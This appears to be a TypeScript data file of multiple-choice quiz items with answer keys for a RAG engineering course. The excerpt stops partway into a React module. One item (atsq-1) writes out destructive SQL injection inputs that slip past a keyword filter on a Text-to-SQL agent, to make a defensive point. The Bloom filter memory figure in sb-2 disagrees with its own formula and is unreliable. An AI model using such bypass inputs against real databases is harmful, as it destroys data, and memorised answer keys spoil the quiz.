import type { ModuleQuizzesMap } from '../types';

// Scenario-based multiple-choice Knowledge Checks for all 28 RAG Curriculum Modules
export const moduleQuizzes: ModuleQuizzesMap = {
  'project-setup': [
    {
      id: 'ps-1',
      question:
        'You deploy a FastAPI + PyTorch embedding worker with 4 Gunicorn workers on a 16-core production machine. Suddenly, CPU context switching spikes by 800% and throughput drops by 65%. What is the root cause and fix?',
      options: [
        'Python GIL contention across processes; switch to single-worker threading.',
        'Each PyTorch worker detects 16 cores and spawns 16 OpenMP/MKL threads (64 threads total competing for 16 cores). Pin OMP_NUM_THREADS=4 and MKL_NUM_THREADS=4.',
        'FastAPI event loop starvation; increase uvicorn keep-alive timeout to 120s.',
        'Docker overlayfs disk bottleneck; mount /tmp as tmpfs.',
      ],
      correctIndex: 1,
      explanation:
        'By default, PyTorch/OpenMP inspects the host CPU count and spawns one thread per physical core per process. 4 workers × 16 threads = 64 compute threads thrashing 16 cores. Explicitly pinning OMP_NUM_THREADS and MKL_NUM_THREADS to (cores / workers) eliminates thread contention.',
    },
    {
      id: 'ps-2',
      question:
        'Why should production Dockerfiles run `uv sync --frozen --no-dev --compile-bytecode` during the multi-stage build rather than installing packages at container startup?',
      options: [
        'It automatically quantizes PyTorch models to INT8 during image build.',
        'It locks dependencies deterministically, strips dev bloat, and pre-compiles .py to .pyc bytecode—slashing cold-start latency by ~300ms.',
        'It bypasses the need for CUDA drivers on GPU nodes.',
        'It enables automatic horizontal pod autoscaling in Kubernetes.',
      ],
      correctIndex: 1,
      explanation:
        'Pre-compiling bytecode (.pyc) at build time eliminates runtime import compilation overhead, while `--frozen` guarantees zero dependency drift across heterogeneous worker nodes.',
    },
    {
      id: 'ps-3',
      question:
        'A GPU inference pod starts on a node with a corrupted NVIDIA driver and silently falls back to CPU execution, spiking latency from 8ms to 240ms. How should your startup sequence prevent this?',
      options: [
        'Enforce a fail-fast assertion (`if not torch.cuda.is_available(): sys.exit(1)`) in production so Kubernetes detects CrashLoopBackOff and alerts immediately.',
        'Automatically reduce embedding dimensions from 1024 to 128 when on CPU.',
        'Catch the CUDA warning and retry `torch.cuda.init()` every 500ms.',
        'Route 100% of traffic to BM25 inside the container.',
      ],
      correctIndex: 0,
      explanation:
        'Silent hardware degradation is a major production anti-pattern. Failing fast at initialization prevents a degraded pod from joining the load balancer rotation.',
    },
  ],

  'corpus-understanding': [
    {
      id: 'cu-1',
      question:
        'An MDN documentation page is updated, reducing its chunk count from 6 chunks down to 4 chunks. If your pipeline performs an in-place upsert using deterministic chunk indices (`doc_id#0`..`doc_id#3`), what failure mode occurs?',
      options: [
        'Qdrant rejects the upsert due to vector dimension mismatch.',
        'Chunks `doc_id#4` and `doc_id#5` remain in the vector store as orphaned "zombie chunks" containing outdated API documentation.',
        'The HNSW graph immediately corrupts and requires a full rebuild.',
        'PostgreSQL foreign keys block the vector upsert.',
      ],
      correctIndex: 1,
      explanation:
        'When a document shrinks, overwriting indices 0..3 leaves indices 4 and 5 untouched in the collection. You must perform a scoped payload deletion (`DELETE WHERE doc_id = X`) prior to upserting the new chunks.',
    },
    {
      id: 'cu-2',
      question:
        'How does a two-level cryptographic hash hierarchy (`doc_id = sha256(canonical_url)` and `content_hash = sha256(normalized_markdown)`) optimize weekly re-crawls of 500,000 docs?',
      options: [
        'It compresses vector embeddings by 75% in RAM.',
        'It allows skipping tokenization, chunking, and GPU embedding whenever `content_hash` matches the stored hash, saving ~95% of compute.',
        'It replaces the need for an HNSW index with a hash table.',
        'It automatically translates non-English docs into English.',
      ],
      correctIndex: 1,
      explanation:
        'Most documentation pages do not change week-to-week. Comparing the normalized Markdown SHA-256 hash lets the ingestion pipeline short-circuit unchanged documents before touching the GPU.',
    },
  ],

  'scraper-building': [
    {
      id: 'sb-1',
      question:
        'You run 50 distributed crawler pods scraping technical portals with a strict politeness SLA of max 5 requests/sec per domain. How do you guarantee this limit without expensive distributed locks?',
      options: [
        'Use random sleep intervals between 1 and 10 seconds on every pod.',
        'Partition the URL queue by `Hash(Domain) mod K` so all URLs for a given domain route to a single worker pod with a local token-bucket rate limiter.',
        'Have each pod query PostgreSQL before every HTTP GET request.',
        'Limit the entire cluster to 1 worker pod.',
      ],
      correctIndex: 1,
      explanation:
        'Domain-hash partitioning ensures a single consumer owns all requests for a specific domain, turning a distributed rate-limiting problem into a zero-overhead local in-memory token bucket.',
    },
    {
      id: 'sb-2',
      question:
        'To deduplicate 10 million crawled URLs in memory with a false-positive probability of 0.01% ($10^{-4}$), why is a Bloom Filter preferred over a raw Python `set` of URL strings?',
      options: [
        'A Bloom filter requires ~19 MB of RAM vs ~640+ MB for raw strings, with O(k) constant-time bit lookups.',
        'A Bloom filter can reverse-engineer the original URL text for full-text search.',
        'Python sets cannot store more than 1 million items.',
        'Bloom filters automatically parse HTML DOM trees.',
      ],
      correctIndex: 0,
      explanation:
        'Using $m = -n \\ln(p) / (\\ln 2)^2$, 10M items at $p=10^{-4}$ needs only ~19.17 MB of bit-array memory, scaling effortlessly to hundreds of millions of URLs.',
    },
  ],

  'chunking-fixed-size': [
    {
      id: 'cfs-1',
      question:
        'With 512-token fixed-size chunking, users asking "What does the `options` parameter of `addEventListener` do?" get poor results because Chunk 2 contains the `options` details while Chunk 1 had the `# EventTarget.addEventListener()` header. What is the cleanest fix?',
      options: [
        'Increase chunk overlap to 95%.',
        'Prepend a canonical Context Prefix (`[Doc: EventTarget.addEventListener | Path: Web/API]`) to every chunk before embedding.',
        'Decrease chunk size to 32 tokens.',
        'Switch from cosine similarity to Euclidean distance.',
      ],
      correctIndex: 1,
      explanation:
        'Injecting the document title and breadcrumb hierarchy prefix into every chunk anchors severed body chunks to the parent entity in bi-encoder embedding space.',
    },
    {
      id: 'cfs-2',
      question:
        'What catastrophic bug occurs if a configuration allows `chunk_overlap >= chunk_size` in a sliding-window chunker?',
      options: [
        'The stride `S = chunk_size - chunk_overlap` becomes <= 0, causing an infinite loop and Out-Of-Memory (OOM) crash.',
        'The tokenizer converts all words to `[UNK]` tokens.',
        'Qdrant automatically drops the collection.',
        'Embeddings become complex numbers.',
      ],
      correctIndex: 0,
      explanation:
        'In a sliding window, the start pointer advances by `stride = chunk_size - chunk_overlap`. If `stride <= 0`, the window never advances.',
    },
  ],

  'chunking-semantic': [
    {
      id: 'cs-1',
      question:
        'Running a 1024-dim GPU model on every single sentence of 1M documents just to find semantic split points costs $8,000. How do production engineers optimize Semantic Chunking?',
      options: [
        'Split randomly every 5 sentences instead.',
        'Use Asymmetric Model Tiering: a fast 22M-param INT8 ONNX model on CPU for sentence boundary detection, then embed only the final merged chunks with the heavy GPU model.',
        'Run the 1024-dim model only on the first sentence of each page.',
        'Use SQL regex splitting exclusively.',
      ],
      correctIndex: 1,
      explanation:
        'Boundary detection only needs relative cosine distance spikes between adjacent sentence windows, which a lightweight ONNX CPU model detects with 96%+ agreement at <1% of the cost.',
    },
    {
      id: 'cs-2',
      question:
        'In a highly uniform API reference doc where all adjacent sentences have nearly identical similarity ($\\sigma_d \\approx 0$), what happens to the threshold $\\tau = \\mu_d + k \\cdot \\sigma_d$ without a minimum floor?',
      options: [
        'The chunker never splits the document.',
        '$\\tau$ collapses toward $\\mu_d$, causing minor fluctuations to trigger splits everywhere and fragmenting the doc into single sentences.',
        'The embedding norm becomes zero.',
        'The tokenizer throws a UnicodeDecodeError.',
      ],
      correctIndex: 1,
      explanation:
        'When variance $\\sigma_d \\approx 0$, adaptive thresholding becomes hypersensitive to noise. Enforcing $\\tau_{\\text{eff}} = \\max(\\tau, 0.25)$ prevents over-fragmentation.',
    },
  ],

  'chunking-hierarchical': [
    {
      id: 'ch-1',
      question:
        'In a Parent-Child (Small-to-Big) hierarchical pipeline, which chunks are embedded in the vector database and which are passed to the LLM prompt?',
      options: [
        'Large Parent chunks are embedded; small Child chunks are passed to the LLM.',
        'Granular Child chunks (e.g., 128 tokens) are embedded for high-precision search, and their deduplicated Parent sections (e.g., 800 tokens) are hydrated for the LLM prompt.',
        'Both Parent and Child chunks are concatenated into the LLM prompt.',
        'Neither; only document titles are embedded.',
      ],
      correctIndex: 1,
      explanation:
        'Small child chunks avoid vector dilution during similarity search, while hydrating the parent section provides complete surrounding prose and code context to the generator.',
    },
    {
      id: 'ch-2',
      question:
        'According to the "Lost in the Middle" phenomenon (Liu et al.), how should you order 3 hydrated parent chunks ($P_1$ highest score, $P_2$ second, $P_3$ third) in the LLM context window?',
      options: [
        'Place $P_3$ first, $P_1$ in the middle, and $P_2$ at the end.',
        'Place $P_1$ at the very beginning, $P_3$ (lowest ranked) in the middle, and $P_2$ at the very end right before the user query.',
        'Sort alphabetically by document URL.',
        'Reverse order: $P_3, P_2, P_1$.',
      ],
      correctIndex: 1,
      explanation:
        'Transformer attention follows a U-shaped curve, attending strongest to the start and end of the prompt. Placing the top two chunks at the boundaries maximizes utilization.',
    },
  ],

  'embedding-sentence-transformers': [
    {
      id: 'est-1',
      question:
        'What is the raw vector memory footprint of 100 million 1024-dimensional embeddings stored in FP32 vs INT8 scalar quantization?',
      options: [
        '40.96 GB in FP32 vs 10.24 GB in INT8.',
        '409.6 GB in FP32 vs 102.4 GB in INT8.',
        '1.02 TB in FP32 vs 512 GB in INT8.',
        '4.1 GB in FP32 vs 1.0 GB in INT8.',
      ],
      correctIndex: 1,
      explanation:
        '100M × 1024 dims × 4 bytes (FP32) = 409.6 GB. With INT8 (1 byte per dimension), memory drops 4x to 102.4 GB.',
    },
    {
      id: 'est-2',
      question:
        'What happens by default when a 900-token code chunk is passed to a Sentence-Transformer model configured with `max_seq_length = 512`?',
      options: [
        'The library raises a `TokenLimitExceededError` exception.',
        'The tokenizer silently truncates and discards tokens 513–900 without warning, losing the bottom half of the code.',
        'The model automatically splits the input into two 450-token embeddings and averages them.',
        'The GPU dynamically doubles its context window.',
      ],
      correctIndex: 1,
      explanation:
        'Hugging Face tokenizers truncate sequences exceeding `max_seq_length` silently. Production pipelines must enforce pre-embedding token length assertions.',
    },
  ],

  'qdrant-setup': [
    {
      id: 'qs-1',
      question:
        'How does Qdrant achieve >98% Recall@10 while cutting RAM usage by ~72% on 20 million 1024-dim vectors?',
      options: [
        'By deleting 75% of the vectors randomly.',
        'By keeping an INT8 Scalar Quantized HNSW index in RAM for fast candidate traversal, then rescoring the Top-K candidates using memory-mapped (mmap) FP32 vectors on NVMe SSD.',
        'By setting `M = 2` and `ef_construct = 4`.',
        'By storing vectors as JSON strings in PostgreSQL.',
      ],
      correctIndex: 1,
      explanation:
        'Two-stage rescoring traverses the compact INT8 graph in RAM to fetch Top-50 candidates in milliseconds, then reads only 50 full-precision FP32 vectors from NVMe to restore near-exact ranking.',
    },
    {
      id: 'qs-2',
      question:
        'A user applies a metadata filter that matches only 5 chunks out of 10 million. Why can pure HNSW graph traversal fail on ultra-low selectivity filters, and how does Qdrant solve it?',
      options: [
        'Graph hops land on non-matching nodes and become disconnected; Qdrant switches to a SIMD exact scan when matching points fall below `full_scan_threshold`.',
        'HNSW does not support metadata payloads at all.',
        'Qdrant re-indexes the entire collection on every filtered query.',
        'The filter converts cosine similarity into Manhattan distance.',
      ],
      correctIndex: 0,
      explanation:
        'When selectivity is tiny, greedy graph routing cannot find valid bridges. Below `full_scan_threshold`, Qdrant uses the inverted payload index to run a fast SIMD scan directly over the matching subset.',
    },
  ],

  'dense-retrieval': [
    {
      id: 'dr-1',
      question:
        'A user asks: "How to combine arrays in JS without mutating?" Dense retrieval ranks `Array.prototype.splice()` (which mutates in place) #1 with 0.82 cosine similarity. Why?',
      options: [
        'The vector database has a corrupted index.',
        'Bi-encoders encode query and document independently into single vectors; lexical weight of "arrays" and "mutating" dominates the single negation word "without".',
        'Cosine similarity cannot handle JavaScript keywords.',
        'The embedding dimension is too large.',
      ],
      correctIndex: 1,
      explanation:
        'Bi-encoders lack cross-attention between query and document tokens. Combining hybrid search with a Stage-2 Cross-Encoder allows "without" to attend directly to "mutates the array in place".',
    },
    {
      id: 'dr-2',
      question:
        'When embeddings are L2 unit-normalized ($\\|\\mathbf{u}\\| = \\|\\mathbf{v}\\| = 1$), what is the exact mathematical relationship between Euclidean distance ($L_2$) and Cosine Similarity?',
      options: [
        '$L_2^2 = 2 - 2\\cos(\\theta)$, meaning minimizing $L_2$ distance is strictly equivalent to maximizing Cosine Similarity and Dot Product.',
        '$L_2$ and Cosine Similarity become completely uncorrelated.',
        'Dot Product equals $L_2^2$.',
        'Cosine Similarity is always 1.0.',
      ],
      correctIndex: 0,
      explanation:
        'By expanding $\\|\\mathbf{u} - \\mathbf{v}\\|_2^2 = \\|\\mathbf{u}\\|^2 + \\|\\mathbf{v}\\|^2 - 2(\\mathbf{u}\\cdot\\mathbf{v}) = 2 - 2\\cos(\\theta)$, unit-normalized vectors yield identical rankings under Dot Product, Cosine, and Euclidean metrics.',
    },
  ],

  'cross-encoder-reranking': [
    {
      id: 'cer-1',
      question:
        'Why can a Cross-Encoder NOT be used directly as a single-stage retriever over 15 million documentation chunks?',
      options: [
        'Cross-encoders only accept images, not text.',
        'Cross-encoders require concatenating `(query, doc)` and running full $O((L_q + L_d)^2)$ self-attention for every candidate; 15M forward passes per query would take hours.',
        'Cross-encoders do not output numerical scores.',
        'Cross-encoders cannot run on GPUs.',
      ],
      correctIndex: 1,
      explanation:
        'Because cross-encoders cannot pre-compute document embeddings offline, they are used exclusively in Stage 2 to re-rank a small candidate pool ($K \\in [30, 50]$) retrieved by fast Stage-1 bi-encoders/BM25.',
    },
    {
      id: 'cer-2',
      question:
        'Cross-Encoder models output raw uncalibrated logits (e.g. ranging from -11.5 to +9.8). How should you normalize these scores before applying confidence thresholds?',
      options: [
        'Clip values to [0, 1] using `max(0, min(1, x))`.',
        'Pass logits through a calibrated Sigmoid function $\\sigma(z / T) = 1 / (1 + e^{-z/T})$.',
        'Divide by the document length in characters.',
        'Take the absolute value of the logit.',
      ],
      correctIndex: 1,
      explanation:
        'A temperature-scaled Sigmoid maps unbounded real-valued logits monotonically onto a calibrated $(0, 1)$ probability interval.',
    },
  ],

  'postgres-logging': [
    {
      id: 'pl-1',
      question:
        'At 10,000 QPS, writing telemetry traces synchronously inside your FastAPI request handler risks which catastrophic failure mode?',
      options: [
        'PostgreSQL lock contention or slow disk I/O exhausts the connection pool, blocking API workers and taking down user-facing search.',
        'The LLM forgets its system prompt.',
        'Qdrant vectors lose precision.',
        'Browser CSS stylesheets fail to load.',
      ],
      correctIndex: 0,
      explanation:
        'Telemetry must never sit on the critical blocking path. Decouple logging via a bounded non-blocking in-memory ring buffer (`asyncio.Queue`) or Kafka stream with load-shedding.',
    },
    {
      id: 'pl-2',
      question:
        'Where should PII and secret scrubbing (e.g. redacting `sk-...` API keys, `ghp_...` personal access tokens, and emails) occur in the telemetry pipeline?',
      options: [
        'Once a month via a batch SQL `UPDATE` script.',
        'In the frontend CSS via `user-select: none`.',
        'At the ingestion boundary middleware BEFORE any log record is enqueued or persisted to disk.',
        'Only when exporting CSV reports.',
      ],
      correctIndex: 2,
      explanation:
        'Scrubbing at the ingestion boundary ensures raw secrets never touch memory queues, WAL logs, database backups, or analytics replicas.',
    },
  ],

  'sql-changelog-db': [
    {
      id: 'scd-1',
      question:
        'In a browser compatibility table where version numbers are stored as `VARCHAR`, why does the SQL query `WHERE version_added >= \'9.0\'` fail to return Chrome `10.0`?',
      options: [
        'Lexicographical string comparison evaluates character-by-character (`\'1\' < \'9\'`), so `\'10.0\' < \'9.0\'` is TRUE.',
        'SQL does not support `>=` on strings.',
        'Chrome 10.0 never existed.',
        'PostgreSQL ignores decimal points.',
      ],
      correctIndex: 0,
      explanation:
        'Standard string sorting compares ASCII codes from left to right. Storing semantic versions as integer tuples `(major INT, minor INT, patch INT)` or using the `semver` extension ensures accurate numerical comparison.',
    },
    {
      id: 'scd-2',
      question:
        'Why is dense vector search poorly suited for answering "Which exact browsers support `Object.groupBy` natively without flags?" compared to a relational SQL lookup?',
      options: [
        'Dense embeddings blur structured tabular rows and version numbers into continuous semantic vectors, causing high hallucination rates on exact boolean/version constraints.',
        'Vector databases cannot store strings.',
        ' `Object.groupBy` is a Python method.',
        'Embeddings only work on paragraphs longer than 1,000 words.',
      ],
      correctIndex: 0,
      explanation:
        'Structured compatibility matrices require exact predicate filtering and aggregation, which relational databases execute deterministically with 100% precision.',
    },
  ],

  'golden-eval-set': [
    {
      id: 'ges-1',
      question:
        'When generating synthetic evaluation questions from documentation chunks, an LLM copies phrases verbatim from the text. Which evaluation distortion does this "lexical leakage" cause?',
      options: [
        'It artificially inflates BM25 / keyword search scores to ~99% while failing to test realistic conceptual user phrasing.',
        'It causes GPU out-of-memory errors.',
        'It makes Cross-Encoders run 10x faster.',
        'It deletes ground-truth chunk IDs.',
      ],
      correctIndex: 0,
      explanation:
        'Real users ask symptom-based questions ("does slice mutate my array?") rather than echoing documentation prose. Synthetic queries must be paraphrased to avoid keyword overlap bias.',
    },
    {
      id: 'ges-2',
      question:
        'How do you detect when an upstream MDN documentation update invalidates a ground-truth test case in your Golden Evaluation Set?',
      options: [
        'Store the SHA-256 hash of each ground-truth chunk at annotation time and flag any test case as `NEEDS_REANNOTATION` when `hash(current_chunk)` changes.',
        'Delete the entire evaluation set every Friday.',
        'Disable CI/CD checks permanently.',
        'Only test on deprecated HTML4 tags.',
      ],
      correctIndex: 0,
      explanation:
        'Content-hash tracking automatically quarantines stale ground-truth items when documentation evolves, preventing false CI failures.',
    },
  ],

  'ragas-evaluation': [
    {
      id: 're-1',
      question:
        'How does the RAGAS **Faithfulness** metric mathematically quantify hallucination?',
      options: [
        'It counts how many words in the answer are spelled correctly.',
        'It decomposes the generated answer into $N$ atomic claims and uses NLI/LLM verification to compute the fraction $|V| / |S|$ of claims entailed by the retrieved context.',
        'It computes the cosine similarity between the user question and the system prompt.',
        'It measures token generation speed in tokens/sec.',
      ],
      correctIndex: 1,
      explanation:
        'Faithfulness = (Number of claims supported by retrieved context) / (Total atomic claims in the generated response). A score of 1.0 means zero unsupported claims.',
    },
    {
      id: 're-2',
      question:
        'Running a frontier LLM judge on 500 queries for every PR costs $60,000/month. What is the production tiered CI/CD evaluation strategy?',
      options: [
        'Run zero evaluations until customers complain.',
        'Tier 1 (Every PR): fast deterministic IR metrics (NDCG, MRR) at $0 cost in <3s; Tier 2 (Nightly): local NLI cross-encoder; Tier 3 (Weekly Release): full frontier LLM-as-a-Judge.',
        'Use random numbers for PR checks.',
        'Only evaluate 1 query per month.',
      ],
      correctIndex: 1,
      explanation:
        'Tiered evaluation gates catch retrieval regressions instantly on every PR for $0 while reserving expensive LLM judge calls for nightly/release milestones.',
    },
  ],

  'ir-metrics': [
    {
      id: 'irm-1',
      question:
        'Your RAG pipeline has a 94% Hit Rate@10, yet users report frequent hallucinations and your MRR (Mean Reciprocal Rank) is only 0.28. What does this diagnose?',
      options: [
        'The relevant chunk is being retrieved around ranks 4–8 (buried in the middle of 9 noise chunks), suffering from LLM attention decay.',
        'The vector database is completely empty.',
        'Hit Rate@10 is mathematically broken.',
        'The LLM temperature is set to 0.0.',
      ],
      correctIndex: 0,
      explanation:
        'High Hit Rate@10 with low MRR proves that relevant chunks exist in the candidate pool but are ranked poorly. Adding a Stage-2 Cross-Encoder promotes the relevant chunk to Rank 1 and lets you trim $K$ to 3.',
    },
    {
      id: 'irm-2',
      question:
        'Why is **NDCG@K** (Normalized Discounted Cumulative Gain) preferred over **MRR** when evaluating multi-chunk technical documentation retrieval?',
      options: [
        'MRR only looks at the rank of the single first relevant document (binary), whereas NDCG accounts for multiple relevant documents and graded relevance scores (e.g., 0 to 3) with logarithmic position discounting.',
        'NDCG does not require ground-truth labels.',
        'MRR cannot be computed in Python.',
        'NDCG ignores the top-ranked document.',
      ],
      correctIndex: 0,
      explanation:
        'Complex queries often require synthesizing 2–3 chunks of varying completeness. NDCG rewards placing all highly relevant chunks near the top of the ranking.',
    },
  ],

  'chunking-ablation-study': [
    {
      id: 'cas-1',
      question:
        'In the Chunking Ablation Study, why did Hierarchical Parent-Child chunking + Cross-Encoder re-ranking LOWER total monthly cloud spend compared to basic Fixed-Size chunking?',
      options: [
        'Because GPUs are free on weekends.',
        'High precision allowed feeding only 1 clean 800-token Parent chunk to the LLM instead of 5 noisy 400-token chunks (2,000 tokens), saving $15,000/mo in LLM prompt tokens against an $880/mo infra cost.',
        'Because Hierarchical chunking deletes all code blocks.',
        'Because Qdrant does not charge for parent chunks.',
      ],
      correctIndex: 1,
      explanation:
        'LLM input token costs dominate RAG TCO at scale. Investing a few hundred dollars in better retrieval/reranking slashes prompt context bloat by 60%+.',
    },
    {
      id: 'cas-2',
      question:
        'When running a scientific ablation study comparing 4 chunking architectures, what must be held strictly constant across all arms?',
      options: [
        'The source corpus, embedding model, LLM generator, system prompt, temperature (0.0), and Golden Evaluation dataset.',
        'The exact number of vectors in Qdrant.',
        'The chunk token length must be 100 in all arms.',
        'Only test 1 question per arm.',
      ],
      correctIndex: 0,
      explanation:
        'Controlled ablation requires isolating the independent variable (chunking + retrieval strategy) while locking all downstream generation and evaluation parameters.',
    },
  ],

  'fastapi-backend': [
    {
      id: 'fb-1',
      question:
        'Your FastAPI Server-Sent Events (SSE) stream works smoothly on `localhost:8000`, but in production behind Nginx, tokens arrive in giant delayed bursts every 5 seconds. What header fixes this?',
      options: [
        '`X-Frame-Options: DENY`',
        '`X-Accel-Buffering: no` (along with `Cache-Control: no-cache`) to disable reverse-proxy response buffering.',
        '`Access-Control-Allow-Origin: *`',
        '`Content-Encoding: gzip`',
      ],
      correctIndex: 1,
      explanation:
        'Nginx buffers upstream responses into 4KB/16KB pages by default before flushing to the client. `X-Accel-Buffering: no` instructs Nginx to flush each SSE frame immediately.',
    },
    {
      id: 'fb-2',
      question:
        'When a user clicks "Stop Generating" or closes their browser tab mid-stream, how do you prevent "Zombie Agent" GPU token waste on the backend?',
      options: [
        'Check `await request.is_disconnected()` in the streaming loop and cancel the upstream LLM task (`asyncio.CancelledError`).',
        'Restart the Kubernetes pod after every request.',
        'Wait for the LLM to finish 2,000 tokens and discard the string.',
        'Use UDP instead of TCP.',
      ],
      correctIndex: 0,
      explanation:
        'Cooperative cancellation propagates client disconnects immediately to the inference coroutine, halting token generation and freeing GPU KV-cache memory.',
    },
  ],

  'langgraph-agent-architecture': [
    {
      id: 'laa-1',
      question:
        'Why does a cyclic LangGraph agent require both `max_iterations` (e.g. 3 rewrites) in `AgentState` AND LangGraph `recursion_limit` in production?',
      options: [
        'To make the graph visualization look symmetrical.',
        'Because an adversarial or unanswerable query could otherwise trap the grader -> rewriter -> retriever loop infinitely, burning unbounded LLM API budget.',
        'Because Python does not support `while` loops.',
        'To force the agent to always rewrite every query 3 times.',
      ],
      correctIndex: 1,
      explanation:
        'Bounding loop transitions guarantees finite termination (Lyapunov convergence) and enforces a strict upper bound on per-request latency and token cost.',
    },
    {
      id: 'laa-2',
      question:
        'When deploying a multi-turn LangGraph agent across 20 stateless Kubernetes pods behind a load balancer, why does `MemorySaver` fail?',
      options: [
        'Subsequent turns from the same user hit different pods with separate process RAM; production requires an external shared checkpointer (`AsyncPostgresSaver` / Redis) keyed by `thread_id`.',
        '`MemorySaver` only works on Windows.',
        '`MemorySaver` encrypts state with a random key.',
        'Kubernetes deletes process memory every 100ms.',
      ],
      correctIndex: 0,
      explanation:
        'Stateless horizontal scaling requires externalizing graph checkpoints to a shared transactional store with optimistic concurrency locking.',
    },
  ],

  'agent-tool-doc-search': [
    {
      id: 'atds-1',
      question:
        'In Reciprocal Rank Fusion $\\text{RRF}(d) = \\sum \\frac{1}{k + \\text{rank}_m(d)}$, why do we combine ranks with $k=60$ instead of simply averaging raw BM25 and Cosine Similarity scores?',
      options: [
        'BM25 scores are unbounded $[0, \\infty)$ while Cosine Similarity is bounded $[-1, 1]$; raw score addition lets a single high BM25 keyword spike overwhelm semantic relevance.',
        'Because $k=60$ is the number of seconds in a minute.',
        'Because Cosine Similarity is always negative.',
        'RRF requires training a neural network.',
      ],
      correctIndex: 0,
      explanation:
        'RRF is scale-invariant and calibration-free: it fuses heterogeneous retrieval engines using rank positions alone, rewarding consensus across dense and lexical retrievers.',
    },
    {
      id: 'atds-2',
      question:
        'How do you capture the recall benefits of HyDE (Hypothetical Document Embeddings) without paying a 500ms LLM generation penalty on every single query?',
      options: [
        'Use Speculative Cascaded Retrieval: run fast direct vector search first (25ms), and only trigger HyDE / Multi-Query if the top cosine score falls below a confidence gate (e.g. $s_1 < 0.88$).',
        'Run HyDE only on queries with fewer than 2 characters.',
        'Pre-generate HyDE answers for every possible English sentence.',
        'Disable vector search completely.',
      ],
      correctIndex: 0,
      explanation:
        '~65% of developer queries are direct lookups that hit high confidence immediately. Gating HyDE behind a fast-path confidence check keeps p50 latency under 50ms.',
    },
  ],

  'agent-tool-sql-query': [
    {
      id: 'atsq-1',
      question:
        'Why is regex filtering (`if "DROP" in sql:`) insufficient to secure a Text-to-SQL agent, and what layers are required instead?',
      options: [
        'Attackers can bypass regex via comments/case (`DrOp/**/TaBlE`) or writable CTEs (`WITH d AS (DELETE...) SELECT * FROM d`); you must combine recursive SQL AST validation (`sqlglot`) with a read-only DB role and `statement_timeout`.',
        'Regex is too slow in Python.',
        'SQL databases do not support read-only users.',
        'Only `TRUNCATE` can delete data.',
      ],
      correctIndex: 0,
      explanation:
        'Defense-in-depth requires walking every node of the parsed SQL Abstract Syntax Tree to verify strictly read-only `SELECT` nodes, backed by database-level `REVOKE` permissions and query timeouts.',
    },
    {
      id: 'atsq-2',
      question:
        'When an LLM generates a SQL query with a hallucinated column name (`no such column: browser_type`), how should a self-correcting LangGraph SQL tool respond?',
      options: [
        'Crash the server and return HTTP 500.',
        'Return the database error message and valid schema columns back into the agent state so the LLM can rewrite and retry the SQL query (up to max retries).',
        'Automatically create the missing column via `ALTER TABLE`.',
        'Return an empty string to the user.',
      ],
      correctIndex: 1,
      explanation:
        'Feeding structured database parser errors back into a bounded self-correction loop resolves >85% of first-attempt dialect and column mismatches automatically.',
    },
  ],

  'agent-tool-clarifying-questions': [
    {
      id: 'atcq-1',
      question:
        'A user types the 1-word query `"slice"`. Retrieval returns chunks split across `Array.prototype.slice`, `String.prototype.slice`, and `Blob.prototype.slice`. How does the agent quantify this ambiguity mathematically?',
      options: [
        'By computing normalized Shannon Entropy $\\mathcal{H}_{\\text{norm}} = -\\frac{1}{\\ln K} \\sum P(I_k) \\ln P(I_k)$ over the topic cluster distribution; high entropy ($\\ge 0.85$) triggers disambiguation.',
        'By checking if the query length is an even number.',
        'By picking a random topic and deleting the others.',
        'By asking the user for their credit card number.',
      ],
      correctIndex: 0,
      explanation:
        'When retrieval probability mass is spread evenly across multiple distinct API namespaces, normalized Shannon entropy approaches 1.0, signaling genuine intent ambiguity.',
    },
    {
      id: 'atcq-2',
      question:
        'How do you avoid the "Interrogation Trap" (annoying users with clarifying questions when they just want a quick answer)?',
      options: [
        'Use Dual-Surface Speculative Rendering: immediately provide the answer for the top-probability intent while showing clickable disambiguation chips ("Showing Array.slice — did you mean String.slice?") at the top.',
        'Ask 5 clarifying questions before every single response.',
        'Never allow users to type queries shorter than 20 words.',
        'Wait 60 seconds before responding.',
      ],
      correctIndex: 0,
      explanation:
        'Speculative rendering delivers zero-friction value immediately if the top guess is right, while offering a 1-click pivot if the user meant an alternative interpretation.',
    },
  ],

  'dspy-setup': [
    {
      id: 'ds-1',
      question:
        'What is the core paradigm shift introduced by **DSPy** compared to manual prompt engineering with string templates?',
      options: [
        'DSPy replaces LLMs with decision trees.',
        'DSPy treats prompts as declarative **Signatures** (`context, question -> answer`) and **Modules** whose instructions and few-shot demonstrations are automatically compiled against an evaluation metric.',
        'DSPy translates Python code into C++ shaders.',
        'DSPy eliminates the need for a vector database.',
      ],
      correctIndex: 1,
      explanation:
        'When you swap foundation models (e.g. GPT-4o to Claude or Llama-3), you simply recompile the DSPy program against your Golden Set rather than hand-rewriting brittle prompt strings.',
    },
    {
      id: 'ds-2',
      question:
        'During DSPy compilation, the optimizer adds 8 verbose Chain-of-Thought demonstrations, boosting accuracy by 2% but tripling prompt token costs and latency. How do you prevent this "Token Bloat Tax"?',
      options: [
        'Cap `max_bootstrapped_demos` (e.g. <= 2) and include a token-length regularization penalty in the optimization metric.',
        'Set `temperature = 2.0`.',
        'Delete the validation set.',
        'Train on a single example.',
      ],
      correctIndex: 0,
      explanation:
        'Regularizing demonstration count and penalizing prompt length ensures the teleprompter selects compact, high-leverage examples on the Pareto frontier.',
    },
  ],

  'dspy-metrics': [
    {
      id: 'dm-1',
      question:
        'Why is using GPT-4o as the sole LLM judge to evaluate a GPT-4o generator problematic, and how do you mitigate it?',
      options: [
        'It exhibits self-preference bias and verbosity bias; mitigate by combining deterministic syntax/citation checks with a cross-family NLI judge and length normalization.',
        'The model provider blocks calling the same model twice.',
        'GPT-4o cannot output JSON.',
        'It always returns a score of 0.0.',
      ],
      correctIndex: 0,
      explanation:
        'Hierarchical multi-judge metrics anchor evaluation in deterministic rules (valid URLs, AST-parseable code) alongside cross-family entailment checks.',
    },
    {
      id: 'dm-2',
      question:
        'What happens if your evaluation `testset` examples are accidentally included in the `trainset` passed to `BootstrapFewShot`?',
      options: [
        'Data leakage / test contamination: the compiled prompt memorizes the exact test answers as few-shot demos, reporting ~99% offline accuracy while failing in production.',
        'DSPy automatically deletes the duplicate files.',
        'The compiler runs twice as fast with better generalization.',
        'The vector database crashes.',
      ],
      correctIndex: 0,
      explanation:
        'Strict cryptographic hash separation between `train.json`, `dev.json`, and `test.json` is mandatory to prevent few-shot memorization of test queries.',
    },
  ],

  'react-frontend-setup': [
    {
      id: 'rfs-1',
      question:
